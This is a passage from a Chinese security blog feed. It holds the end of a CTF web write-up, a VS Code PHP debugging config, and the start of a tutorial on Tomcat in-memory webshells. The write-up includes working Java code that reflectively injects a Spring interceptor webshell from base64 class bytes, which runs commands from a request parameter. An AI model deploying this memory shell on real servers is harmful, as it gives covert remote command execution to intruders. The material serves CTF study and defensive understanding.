obj.getClass().getDeclaredField(fieldName);<br>        field.setAccessible(<span class="hljs-keyword">true</span>);<br>        field.set(obj, value);<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>不出网用spring内存马注入shell<a href="https://myzxcg.com/2021/11/Spring-%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0/">参考</a></p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example.eaasyjava.controller;<br><br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;<br><span class="hljs-keyword">import</span> org.springframework.web.context.WebApplicationContext;<br><span class="hljs-keyword">import</span> org.springframework.web.context.request.RequestContextHolder;<br><span class="hljs-keyword">import</span> org.springframework.web.context.request.ServletRequestAttributes;<br><span class="hljs-keyword">import</span> org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;<br><span class="hljs-keyword">import</span> org.springframework.web.servlet.support.RequestContextUtils;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">inject</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">AbstractTranslet</span> </span>&#123;<br>    <span class="hljs-keyword">static</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<br><span class="hljs-comment">//            WebApplicationContext context = RequestContextUtils.findWebApplicationContext(((ServletRequestAttributes) RequestContextHolder.currentRequestAttributes()).getRequest());</span><br><span class="hljs-comment">//从requestMappingHandlerMapping中获取adaptedInterceptors属性 老版本是DefaultAnnotationHandlerMapping</span><br>            WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(<span class="hljs-string">&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;</span>, <span class="hljs-number">0</span>);<br>            org.springframework.web.servlet.handler.AbstractHandlerMapping abstractHandlerMapping = (org.springframework.web.servlet.handler.AbstractHandlerMapping) context.getBean(RequestMappingHandlerMapping.class);<br><br>            java.lang.reflect.Field field = org.springframework.web.servlet.handler.AbstractHandlerMapping.class.getDeclaredField(<span class="hljs-string">&quot;adaptedInterceptors&quot;</span>);<br>            field.setAccessible(<span class="hljs-keyword">true</span>);<br>            java.util.ArrayList&lt;Object&gt; adaptedInterceptors = (java.util.ArrayList&lt;Object&gt;) field.get(abstractHandlerMapping);<br><br>            String className = <span class="hljs-string">&quot;magicInterceptor&quot;</span>;<br>            <span class="hljs-comment">//加载com.example.spring.magicInterceptor类的字节码</span><br>            String b64 = <span class="hljs-string">&quot;yv66vgAAADQAhwoAIABGCAA4CwBHAEgLAEkASggASwgATAoATQBOCgAMAE8IAFAKAAwAUQcAUgcAUwgAVAgAVQoACwBWCABXCABYBwBZCgALAFoKAFsAXAoAEgBdCABeCgASAF8KABIAYAoAEgBhCgASAGIKAGMAZAoAYwBlCgBjAGIHAGYHAGcHAGgBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAJUxjb20vZXhhbXBsZS9zcHJpbmcvbWFnaWNJbnRlcmNlcHRvcjsBAAlwcmVIYW5kbGUBAGQoTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3Q7TGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3BvbnNlO0xqYXZhL2xhbmcvT2JqZWN0OylaAQABcAEAGkxqYXZhL2xhbmcvUHJvY2Vzc0J1aWxkZXI7AQAGd3JpdGVyAQAVTGphdmEvaW8vUHJpbnRXcml0ZXI7AQABbwEAEkxqYXZhL2xhbmcvU3RyaW5nOwEAAWMBABNMamF2YS91dGlsL1NjYW5uZXI7AQAHcmVxdWVzdAEAJ0xqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0OwEACHJlc3BvbnNlAQAoTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3BvbnNlOwEAB2hhbmRsZXIBABJMamF2YS9sYW5nL09iamVjdDsBAARjb2RlAQANU3RhY2tNYXBUYWJsZQcAUwcAaQcAUgcAWQcAZwcAagcAawcAbAcAZgEACkV4Y2VwdGlvbnMBAApTb3VyY2VGaWxlAQAVbWFnaWNJbnRlcmNlcHRvci5qYXZhDAAhACIHAGoMAG0AbgcAawwAbwBwAQAAAQAHb3MubmFtZQcAcQwAcgBuDABzAHQBAAN3aW4MAHUAdgEAGGphdmEvbGFuZy9Qcm9jZXNzQnVpbGRlcgEAEGphdmEvbGFuZy9TdHJpbmcBAAdjbWQuZXhlAQACL2MMACEAdwEABy9iaW4vc2gBAAItYwEAEWphdmEvdXRpbC9TY2FubmVyDAB4AHkHAHoMAHsAfAwAIQB9AQACXEEMAH4AfwwAgACBDACCAHQMAIMAIgcAaQwAhACFDACGACIBABNqYXZhL2xhbmcvRXhjZXB0aW9uAQAjY29tL2V4YW1wbGUvc3ByaW5nL21hZ2ljSW50ZXJjZXB0b3IBAEFvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L2hhbmRsZXIvSGFuZGxlckludGVyY2VwdG9yQWRhcHRlcgEAE2phdmEvaW8vUHJpbnRXcml0ZXIBACVqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0AQAmamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2UBABBqYXZhL2xhbmcvT2JqZWN0AQAMZ2V0UGFyYW1ldGVyAQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsBAAlnZXRXcml0ZXIBABcoKUxqYXZhL2lvL1ByaW50V3JpdGVyOwEAEGphdmEvbGFuZy9TeXN0ZW0BAAtnZXRQcm9wZXJ0eQEAC3RvTG93ZXJDYXNlAQAUKClMamF2YS9sYW5nL1N0cmluZzsBAAhjb250YWlucwEAGyhMamF2YS9sYW5nL0NoYXJTZXF1ZW5jZTspWgEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYBAAVzdGFydAEAFSgpTGphdmEvbGFuZy9Qcm9jZXNzOwEAEWphdmEvbGFuZy9Qcm9jZXNzAQAOZ2V0SW5wdXRTdHJlYW0BABcoKUxqYXZhL2lvL0lucHV0U3RyZWFtOwEAGChMamF2YS9pby9JbnB1dFN0cmVhbTspVgEADHVzZURlbGltaXRlcgEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvdXRpbC9TY2FubmVyOwEAB2hhc05leHQBAAMoKVoBAARuZXh0AQAFY2xvc2UBAAV3cml0ZQEAFShMamF2YS9sYW5nL1N0cmluZzspVgEABWZsdXNoACEAHwAgAAAAAAACAAEAIQAiAAEAIwAAAC8AAQABAAAABSq3AAGxAAAAAgAkAAAABgABAAAABwAlAAAADAABAAAABQAmACcAAAABACgAKQACACMAAAG6AAYACQAAAK8rEgK5AAMCADoEGQTGAKEsuQAEAQA6BRIFOgYSBrgAB7YACBIJtgAKmQAiuwALWQa9AAxZAxINU1kEEg5TWQUZBFO3AA86B6cAH7sAC1kGvQAMWQMSEFNZBBIRU1kFGQRTtwAPOge7ABJZGQe2ABO2ABS3ABUSFrYAFzoIGQi2ABiZAAsZCLYAGacABRkGOgYZCLYAGhkFGQa2ABsZBbYAHBkFtgAdpwAFOgUDrASsAAEADwCmAKkAHgADACQAAABGABEAAAAKAAoACwAPAA0AFwAOABsAEAArABEASgATAGYAFQB8ABYAkAAXAJUAGACcABkAoQAaAKYAHACpABsAqwAdAK0AHwAlAAAAZgAKAEcAAwAqACsABwAXAI8ALAAtAAUAGwCLAC4ALwAGAGYAQAAqACsABwB8ACoAMAAxAAgAAACvACYAJwAAAAAArwAyADMAAQAAAK8ANAA1AAIAAACvADYANwADAAoApQA4AC8ABAA5AAAAOQAH/gBKBwA6BwA7BwA6/AAbBwA8/AAlBwA9QQcAOv8AGgAFBwA+BwA/BwBABwBBBwA6AAEHAEIBAQBDAAAABAABAB4AAQBEAAAAAgBF&quot;</span>; <span class="hljs-comment">// magicInterceptor类class的base64编码</span><br>            <span class="hljs-keyword">byte</span>[] bytes = sun.misc.BASE64Decoder.class.newInstance().decodeBuffer(b64);<br>            java.lang.ClassLoader classLoader = Thread.currentThread().getContextClassLoader();<br>            java.lang.reflect.Method m0 = ClassLoader.class.getDeclaredMethod(<span class="hljs-string">&quot;defineClass&quot;</span>, String.class, <span class="hljs-keyword">byte</span>[].class, <span class="hljs-keyword">int</span>.class, <span class="hljs-keyword">int</span>.class);<br>            m0.setAccessible(<span class="hljs-keyword">true</span>);<br>            m0.invoke(classLoader, className, bytes, <span class="hljs-number">0</span>, bytes.length);<br>            <span class="hljs-comment">//添加com.example.spring.magicInterceptor类到adaptedInterceptors</span><br>            adaptedInterceptors.add(classLoader.loadClass(className).newInstance());<br><br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">transform</span><span class="hljs-params">(DOM document, SerializationHandler[] handlers)</span> <span class="hljs-keyword">throws</span> TransletException </span>&#123;<br><br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">transform</span><span class="hljs-params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="hljs-keyword">throws</span> TransletException </span>&#123;<br><br>    &#125;<br>&#125;<br><br></code></pre></div></td></tr></table></figure><p>最后执行命令即可</p><figure class="highlight handlebars"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs handlebars"><span class="xml">http://127.0.0.1:8809?code=</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">cmd</span>&#125;&#125;</span><br></code></pre></div></td></tr></table></figure><h1 id="tprint"><a href="#tprint" class="headerlink" title="tprint"></a>tprint</h1><p>参考<a href="https://ghostasky.github.io/2022/03/19/dompdf%200day(RCE)%E5%A4%8D%E7%8E%B0/">dompdf 0day分析</a></p><h1 id="springcoffee"><a href="#springcoffee" class="headerlink" title="springcoffee"></a>springcoffee</h1>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>vscode配置php调试</title>
    <link href="/2022/07/10/2022-7-10-vscode%E8%B0%83%E8%AF%95php/"/>
    <url>/2022/07/10/2022-7-10-vscode%E8%B0%83%E8%AF%95php/</url>
    
    <content type="html"><![CDATA[<p>贴个json，方便复制。。</p><h1 id="vscode调试php"><a href="#vscode调试php" class="headerlink" title="vscode调试php"></a>vscode调试php</h1><figure class="highlight json"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs json">&#123;<br>    <span class="hljs-comment">// 使用 IntelliSense 了解相关属性。 </span><br>    <span class="hljs-comment">// 悬停以查看现有属性的描述。</span><br>    <span class="hljs-comment">// 欲了解更多信息，请访问: https://go.microsoft.com/fwlink/?linkid=830387</span><br>    <span class="hljs-attr">&quot;version&quot;</span>: <span class="hljs-string">&quot;0.2.0&quot;</span>,<br>    <span class="hljs-attr">&quot;configurations&quot;</span>: [<br>        &#123;<br>            <span class="hljs-attr">&quot;name&quot;</span>: <span class="hljs-string">&quot;Listen for Xdebug&quot;</span>,<br>            <span class="hljs-attr">&quot;type&quot;</span>: <span class="hljs-string">&quot;php&quot;</span>,<br>            <span class="hljs-attr">&quot;request&quot;</span>: <span class="hljs-string">&quot;launch&quot;</span>,<br>            <span class="hljs-attr">&quot;port&quot;</span>: <span class="hljs-number">9003</span><br>        &#125;,<br>        &#123;<br>            <span class="hljs-attr">&quot;name&quot;</span>: <span class="hljs-string">&quot;Launch currently open script&quot;</span>,<br>            <span class="hljs-attr">&quot;type&quot;</span>: <span class="hljs-string">&quot;php&quot;</span>,<br>            <span class="hljs-attr">&quot;request&quot;</span>: <span class="hljs-string">&quot;launch&quot;</span>,<br>            <span class="hljs-attr">&quot;program&quot;</span>: <span class="hljs-string">&quot;$&#123;file&#125;&quot;</span>,<br>            <span class="hljs-attr">&quot;cwd&quot;</span>: <span class="hljs-string">&quot;$&#123;fileDirname&#125;&quot;</span>,<br>            <span class="hljs-attr">&quot;port&quot;</span>: <span class="hljs-number">0</span>,<br>            <span class="hljs-attr">&quot;runtimeArgs&quot;</span>: [<br>                <span class="hljs-string">&quot;-dxdebug.start_with_request=yes&quot;</span><br>            ],<br>            <span class="hljs-attr">&quot;env&quot;</span>: &#123;<br>                <span class="hljs-attr">&quot;XDEBUG_MODE&quot;</span>: <span class="hljs-string">&quot;debug,develop&quot;</span>,<br>                <span class="hljs-attr">&quot;XDEBUG_CONFIG&quot;</span>: <span class="hljs-string">&quot;client_port=$&#123;port&#125;&quot;</span><br>            &#125;<br>        &#125;,<br>        &#123;<br>            <span class="hljs-attr">&quot;name&quot;</span>: <span class="hljs-string">&quot;Launch Built-in web server&quot;</span>,<br>            <span class="hljs-attr">&quot;type&quot;</span>: <span class="hljs-string">&quot;php&quot;</span>,<br>            <span class="hljs-attr">&quot;request&quot;</span>: <span class="hljs-string">&quot;launch&quot;</span>,<br>            <span class="hljs-attr">&quot;runtimeArgs&quot;</span>: [<br>                <span class="hljs-string">&quot;-dxdebug.mode=debug&quot;</span>,<br>                <span class="hljs-string">&quot;-dxdebug.start_with_request=yes&quot;</span>,<br>                <span class="hljs-string">&quot;-S&quot;</span>,<br>                <span class="hljs-string">&quot;localhost:0&quot;</span><br>            ],<br>            <span class="hljs-attr">&quot;program&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>            <span class="hljs-attr">&quot;cwd&quot;</span>: <span class="hljs-string">&quot;$&#123;workspaceRoot&#125;&quot;</span>,<br>            <span class="hljs-attr">&quot;port&quot;</span>: <span class="hljs-number">9003</span>,<br>            <span class="hljs-attr">&quot;serverReadyAction&quot;</span>: &#123;<br>                <span class="hljs-attr">&quot;pattern&quot;</span>: <span class="hljs-string">&quot;Development Server \\(http://localhost:([0-9]+)\\) started&quot;</span>,<br>                <span class="hljs-attr">&quot;uriFormat&quot;</span>: <span class="hljs-string">&quot;http://localhost:%s&quot;</span>,<br>                <span class="hljs-attr">&quot;action&quot;</span>: <span class="hljs-string">&quot;openExternally&quot;</span><br>            &#125;<br>        &#125;<br>    ]<br>&#125;<br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>php</category>
      
    </categories>
    
    
    <tags>
      
      <tag>php</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>javaTomcat内存马注入</title>
    <link href="/2022/07/01/2022-7-1-javaTomcat%E5%86%85%E5%AD%98%E9%A9%AC%E6%B3%A8%E5%85%A5/"/>
    <url>/2022/07/01/2022-7-1-javaTomcat%E5%86%85%E5%AD%98%E9%A9%AC%E6%B3%A8%E5%85%A5/</url>
    
    <content type="html"><![CDATA[<p>[参考文章][<a href="https://www.cnblogs.com/nice0e3/p/14622879.html#0x01-tomcat%E6%9E%B6%E6%9E%84%E5%88%86%E6%9E%90]">https://www.cnblogs.com/nice0e3/p/14622879.html#0x01-tomcat%E6%9E%B6%E6%9E%84%E5%88%86%E6%9E%90]</a></p><p>[参考文章2][<a href="https://goodapple.top/archives/1355]">https://goodapple.top/archives/1355]</a></p><h1 id="Tomcat架构分析"><a href="#Tomcat架构分析" class="headerlink" title="Tomcat架构分析"></a>Tomcat架构分析</h1><p>宏观上的分析网上都有，这里贴一些写的比较详细的。</p><h3 id="Server"><a href="#Server" class="headerlink" title="Server"></a>Server</h3><p><img src="https://goodapple.top/wp-content/uploads/2022/04/%E5%9B%BE%E7%89%87-72.png" alt="img"></p><p><img src="https://img-blog.csdnimg.cn/img_convert/b9f87d34d650259db9b361276411fe50.png" alt="img"></p><p><img src="https://img-blog.csdnimg.cn/img_convert/42463b4026198e420f22c71429175b20.png" alt="img"></p><ul><li><p>Server：<br>Server，即指的WEB服务器,一个Server包括多个Service。</p></li><li><p>Service：</p><p>Service的作用是在<code>Connector</code>和<code>Engine</code>外面包了一层（可看上图），把它们组装在一起，对外提供服务。一个<code>Service</code>可以包含多个<code>Connector</code>，但是只能包含一个<code>Engine</code>，其中<code>Connector</code>的作用是从客户端接收请求，Engine的作用是处理接收进来的请求。后面再来细节分析Service。</p></li><li><p>Connector：</p><p>Tomcat有两个典型的<code>Connector</code>，一个直接侦听来自browser的http请求，一个侦听来自其它WebServer的请求Coyote Http/1.1 Connector 在端口8080处侦听来自客户browser的http请求<br>Coyote JK2 Connector 在端口8009处侦听来自其它WebServer(Apache)的servlet/jsp代理请求。</p></li><li><p>Engine：</p><p>Engine下可以配置多个虚拟主机，每个虚拟主机都有一个域名当<code>Engine</code>获得一个请求时，它把该请求匹配到某个<code>Host</code>上，然后把该请求交给该<code>Host</code>来处理<code>Engine</code>有一个默认虚拟主机，当请求无法匹配到任何一个<code>Host</code>上的时候，将交给该默认Host来处理。</p></li><li><p>Host：</p><p>代表一个虚拟主机，每个虚拟主机和某个网络域名Domain Name相匹配<br>每个虚拟主机下都可以部署(deploy)一个或者多个Web App，每个Web App对应于一个Context，有一个Context path，当Host获得一个请求时，将把该请求匹配到某个Context上，然后把该请求交给该Context来处理匹配的方法是“最长匹配”，所以一个path==””的Context将成为该Host的默认Context所有无法和其它Context的路径名匹配的请求都将最终和该默认Context匹配。</p></li><li><p>Context：</p><p>一个Context对应于一个Web Application，一个<code>WebApplication</code>由一个或者多个Servlet组成<br>Context在创建的时候将根据配置文件<code>$CATALINA_HOME/conf/web.xml</code>和<code>$WEBAPP_HOME/WEB-INF/web.xml</code>载入Servlet类，当Context获得请求时，将在自己的映射表(mapping table)中寻找相匹配的Servlet类。如果找到，则执行该类，获得请求的回应，并返回。</p></li></ul><p><strong>下面来看详细说明：</strong></p><h3 id="Connector"><a href="#Connector" class="headerlink" title="Connector"></a>Connector</h3><p>Connector也被叫做连接器。Connector将在某个指定的端口上来监听客户的请求，把从socket传递过来的数据，封装成Request，传递给Engine来处理，并从Engine处获得响应并返回给客户端。</p><figure class="highlight mipsasm"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs mipsasm">Engine：最顶层容器组件，其下可以包含多个 Host。<br>Host：一个 Host 代表一个虚拟主机，其下可以包含多个 <span class="hljs-built_in">Context</span>。<br><span class="hljs-built_in">Context</span>：一个 <span class="hljs-built_in">Context</span> 代表一个 Web 应用，其下可以包含多个 Wrapper。<br>Wrapper：一个 Wrapper 代表一个 Servlet。<br></code></pre></div></td></tr></table></figure><p>对照图：</p><p><img src="https://img-blog.csdnimg.cn/img_convert/2ee1e41586768dd6bdeae2967587cc4b.png" alt="img">]</p><h3 id="ProtocolHandler"><a href="#ProtocolHandler" class="headerlink" title="ProtocolHandler"></a>ProtocolHandler</h3><p>在<code>Connector</code>中，包含了多个组件，<code>Connector</code>使用<code>ProtocolHandler</code>处理器来处理请求。不同的<code>ProtocolHandler</code>代表不同连接类型。<code>ProtocolHandler</code>处理器可以用看作是<strong>协议处理统筹者</strong>，通过管理其他工作组件实现对请求的处理。<code>ProtocolHandler</code>包含了三个非常重要的组件,这三个组件分别是：</p><figure class="highlight diff"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs diff"><span class="hljs-deletion">- Endpoint: 负责接受，处理socket网络连接</span><br><span class="hljs-deletion">- Processor： 负责将从Endpoint接受的socket连接根据协议类型封装成request</span><br><span class="hljs-deletion">- Adapter:负责将封装好的Request交给Container进行处理,解析为可供Container调用的继承了      ServletRequest接口、ServletResponse接口的对象。</span><br></code></pre></div></td></tr></table></figure><p>请求经Connector处理完毕后，传递给Container进行处理。</p><h3 id="Container"><a href="#Container" class="headerlink" title="Container"></a>Container</h3><p>Container容器则是负责封装和管理Servlet 处理用户的servlet请求，并返回对象给web用户的模块。</p><p><img src="https://img-blog.csdnimg.cn/img_convert/0710d42a2298dd902e0b3d1b362da7d9.png" alt="img"></p><p>Container 处理请求，内部是使用<code>Pipeline-Value</code>管道来处理的，每个 <code>Pipeline</code> 都有特定的 <code>Value（BaseValue）</code>，<strong>BaseValue 会在最后执行</strong>。上层容器的<code>BaseValue</code> 会调用下层容器的管道，<code>FilterChain</code> 其实就是这种模式，<code>FilterChain</code>相当于 <code>Pipeline</code>，每个 Filter 相当于一个 Value。4 个容器的<code>BaseValve</code> 分别是<code>StandardEngineValve</code>、<code>StandardHostValve</code> 、<code>StandardContextValve 和StandardWrapperValve</code>。每个Pipeline 都有特定的Value ，而且是在管道的最后一个执行，这个Valve 叫<code>BaseValve</code>，<code>BaseValve</code> 是不可删除的</p><p><img src="https://img-blog.csdnimg.cn/img_convert/6bbaf16e8ec325a2817db4d3a425ce0f.png" alt="img"></p><p><img src="https://img-blog.csdnimg.cn/img_convert/e9bff654cff00cfac45512c551038637.png" alt="img"></p><p><img src="https://img-blog.csdnimg.cn/img_convert/e2b4e7c22716b9efe56819ed8c5e67d1.png" alt="img"></p><p>这三张图其实就很好的解释了他的一个执行流程，看到最后一张图，在<code>wrapper-Pipline</code>执行完成后会去创建一个<code>FilterChain</code>对象也就是我们的过滤链。这里来解释一下过滤链。</p><p><strong>过滤链</strong>：在一个 Web 应用程序中可以注册多个 Filter 程序，每个 Filter 程序都可以针对某一个 URL 进行拦截。如果多个 Filter 程序都对同一个 URL 进行拦截，那么这些 Filter 就会组成一个Filter 链（也称<br>过滤器链）。</p><p><img src="https://img-blog.csdnimg.cn/img_convert/8886e8f556e235d0acf572368fa8b9d0.png" alt="img"></p><p>如果做过Java web开发的话，不难发现在配置Filter 的时候，假设执行完了就会来到下一个Filter 里面，如果都<code>FilterChain.doFilter</code>进行放行的话，那么这时候才会执行servlet内容。原理如上。</p><p>整体的执行流程，如下图：</p><p><img src="https://img-blog.csdnimg.cn/img_convert/b69bc2d6454e59996ec0d2d179696424.png" alt="img"></p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">Server :<br>- Service <br>-- Connector: 客户端接收请求<br>--- ProtocolHandler: 管理其他工作组件实现对请求的处理<br>---- Endpoint: 负责接受，处理socket网络连接<br>---- Processor: 负责将从Endpoint接受的socket连接根据协议类型封装成request<br>---- Adapter: 负责将封装好的Request交给Container进行处理,解析为可供Container调用的继承了ServletRequest接口、ServletResponse接口的对象。<br>--- Container: 负责封装和管理Servlet 处理用户的servlet请求，并返回对象给web用户的模块<br>-- Engine:处理接收进来的请求<br>--- Host: 虚拟主机<br>--- Context: 相当于一个web应用<br></code></pre></div></td></tr></table></figure><h3 id="Tomcat-与-Servlet-的关系"><a href="#Tomcat-与-Servlet-的关系" class="headerlink" title="Tomcat 与 Servlet 的关系"></a>Tomcat 与 Servlet 的关系</h3><p>参考链接：<a href="https://www.freebuf.com/articles/system/151433.html">https://www.freebuf.com/articles/system/151433.html</a></p><blockquote><p>Tomcat 是 Web 应用服务器，是一个 Servlet/JSP 容器，Tomcat 作为 Servlet 的容器，能够将用户的请求发送给 Servlet，并且将 Servlet 的响应返回给用户，Tomcat中有四种类型的Servlet容器，从上到下分别是 Engine、Host、Context、Wrapper</p><ol><li>Engine，实现类为 <code>org.apache.catalina.core.StandardEngine</code></li><li>Host，实现类为<code>org.apache.catalina.core.StandardHost</code></li><li>Context，实现类为<code> org.apache.catalina.core.StandardContext</code></li><li>Wrapper，实现类为 <code>org.apache.catalina.core.StandardWrapper</code></li></ol><p>每个Wrapper实例表示一个具体的Servlet定义，<code>StandardWrapper</code>是Wrapper接口的标准实现类（<code>StandardWrapper </code>的主要任务就是载入Servlet类并且进行实例化）</p></blockquote><h1 id="Tomcat内存马分类"><a href="#Tomcat内存马分类" class="headerlink" title="Tomcat内存马分类"></a>Tomcat内存马分类</h1><p>Tomcat内存马大致可以分为三类，分别是Listener型、Filter型、Servlet型。其实就是针对Java Web核心的三大组件，也可以说是针对tomcat在实例化过程中每个阶段的操作。tomcat实例化中执行的顺序是<code>Listener</code>-&gt;<code>Filter</code>-&gt;<code>Servlet</code>。</p><h2 id="Filter型"><a href="#Filter型" class="headerlink" title="Filter型"></a>Filter型</h2><h3 id="Filter调用链"><a href="#Filter调用链" class="headerlink" title="Filter调用链"></a>Filter调用链</h3><p>在Servlet容器中，Filter的调用是通过FilterChain实现的</p><p><img src="https://goodapple.top/wp-content/uploads/2022/05/image.png" alt="img"></p><p>实现一个简单的demoFilter，看一下tomcat内部是如何实现filter的</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example.tomcat_webshell.shell;<br><br><br><span class="hljs-keyword">import</span> javax.servlet.*;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">DemoFilter</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">Filter</span> </span>&#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">init</span><span class="hljs-params">(FilterConfig filterConfig)</span> <span class="hljs-keyword">throws</span> ServletException </span>&#123;<br>    